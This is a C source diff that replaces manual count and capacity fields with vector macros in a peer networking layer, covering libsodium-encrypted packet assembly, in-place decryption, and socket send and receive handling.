@@ -71,7 +71,7 @@ void laikaS_startOutPacket(struct sLaika_peer *peer, LAIKAPKT_ID id)
 
     laikaS_writeByte(sock, id);
 
-    peer->outStart = sock->outCount;
+    peer->outStart = laikaM_countVector(sock->outBuf);
     if (peer->useSecure) { /* if we're encrypting this packet, append the nonce right after the
                               packet ID */
         uint8_t nonce[crypto_secretbox_NONCEBYTES];
@@ -88,26 +88,26 @@ int laikaS_endOutPacket(struct sLaika_peer *peer)
 
     if (peer->useSecure) {
         /* make sure we have enough space */
-        laikaM_growarray(uint8_t, sock->outBuf, crypto_secretbox_MACBYTES, sock->outCount,
-                         sock->outCap);
+        laikaM_growVector(uint8_t, sock->outBuf, crypto_secretbox_MACBYTES);
 
         /* packet body starts after the id & nonce */
         body = &sock->outBuf[peer->outStart + crypto_secretbox_NONCEBYTES];
         /* encrypt packet body in-place */
         if (crypto_secretbox_easy(body, body,
-                                  (sock->outCount - peer->outStart) - crypto_secretbox_NONCEBYTES,
+                                  (laikaM_countVector(sock->outBuf) - peer->outStart) -
+                                      crypto_secretbox_NONCEBYTES,
                                   &sock->outBuf[peer->outStart], peer->outKey) != 0) {
             LAIKA_ERROR("Failed to encrypt packet!\n");
         }
 
-        sock->outCount += crypto_secretbox_MACBYTES;
+        laikaM_countVector(sock->outBuf) += crypto_secretbox_MACBYTES;
     }
 
     /* add to pollList's out queue */
     laikaP_pushOutQueue(peer->pList, &peer->sock);
 
     /* return packet size and prepare for next outPacket */
-    sz = sock->outCount - peer->outStart;
+    sz = laikaM_countVector(sock->outBuf) - peer->outStart;
     peer->outStart = -1;
     return sz;
 }
@@ -148,30 +148,31 @@ void laikaS_startInPacket(struct sLaika_peer *peer, bool variadic)
     if (peer->useSecure && !variadic && peer->pktSize != 0)
         peer->pktSize += crypto_secretbox_MACBYTES + crypto_secretbox_NONCEBYTES;
 
-    peer->inStart = sock->inCount;
+    peer->inStart = laikaM_countVector(sock->inBuf);
 }
 
 int laikaS_endInPacket(struct sLaika_peer *peer)
 {
     struct sLaika_socket *sock = &peer->sock;
     uint8_t *body;
-    size_t sz = sock->inCount - peer->inStart;
+    size_t sz = laikaM_countVector(sock->inBuf) - peer->inStart;
 
     if (peer->useSecure && sz > crypto_secretbox_MACBYTES + crypto_secretbox_NONCEBYTES) {
         body = &sock->inBuf[peer->inStart + crypto_secretbox_NONCEBYTES];
 
         /* decrypt packet body in-place */
-        if (crypto_secretbox_open_easy(
-                body, body, (sock->inCount - peer->inStart) - crypto_secretbox_NONCEBYTES,
-                &sock->inBuf[peer->inStart], peer->inKey) != 0) {
+        if (crypto_secretbox_open_easy(body, body,
+                                       (laikaM_countVector(sock->inBuf) - peer->inStart) -
+                                           crypto_secretbox_NONCEBYTES,
+                                       &sock->inBuf[peer->inStart], peer->inKey) != 0) {
             LAIKA_ERROR("Failed to decrypt packet!\n");
         }
 
         /* decrypted message is smaller now */
-        sock->inCount -= crypto_secretbox_MACBYTES;
+        laikaM_countVector(sock->inBuf) -= crypto_secretbox_MACBYTES;
 
         /* remove nonce */
-        laikaM_rmvarray(sock->inBuf, sock->inCount, peer->inStart, crypto_secretbox_NONCEBYTES);
+        laikaM_rmvVector(sock->inBuf, peer->inStart, crypto_secretbox_NONCEBYTES);
 
         sz -= crypto_secretbox_MACBYTES + crypto_secretbox_NONCEBYTES;
     }
@@ -254,18 +255,19 @@ bool laikaS_handlePeerIn(struct sLaika_socket *sock)
     default:
     _HandlePacketBody:
         /* try grabbing the rest of the packet */
-        if (laikaS_rawRecv(&peer->sock, peer->pktSize - peer->sock.inCount, &recvd) != RAWSOCK_OK)
+        if (laikaS_rawRecv(&peer->sock, peer->pktSize - laikaM_countVector(peer->sock.inBuf),
+                           &recvd) != RAWSOCK_OK)
             return false;
 
         /* have we received the full packet? */
-        if (peer->pktSize == peer->sock.inCount) {
+        if (peer->pktSize == laikaM_countVector(peer->sock.inBuf)) {
             peer->pktSize = laikaS_endInPacket(peer);
 
             /* dispatch to packet handler */
             peer->packetTbl[peer->pktID].handler(peer, peer->pktSize, peer->uData);
 
             /* reset */
-            peer->sock.inCount = 0;
+            laikaM_countVector(peer->sock.inBuf) = 0;
             peer->pktID = LAIKAPKT_MAXNONE;
         }
 
@@ -280,10 +282,10 @@ bool laikaS_handlePeerOut(struct sLaika_socket *sock)
     struct sLaika_peer *peer = (struct sLaika_peer *)sock;
     int sent;
 
-    if (peer->sock.outCount == 0) /* sanity check */
+    if (laikaM_countVector(peer->sock.outBuf) == 0) /* sanity check */
         return true;
 
-    switch (laikaS_rawSend(&peer->sock, peer->sock.outCount, &sent)) {
+    switch (laikaS_rawSend(&peer->sock, laikaM_countVector(peer->sock.outBuf), &sent)) {
     case RAWSOCK_OK: /* we're ok! */
         /* if POLLOUT was set, unset it */
         laikaP_rmvPollOut(peer->pList, &peer->sock);
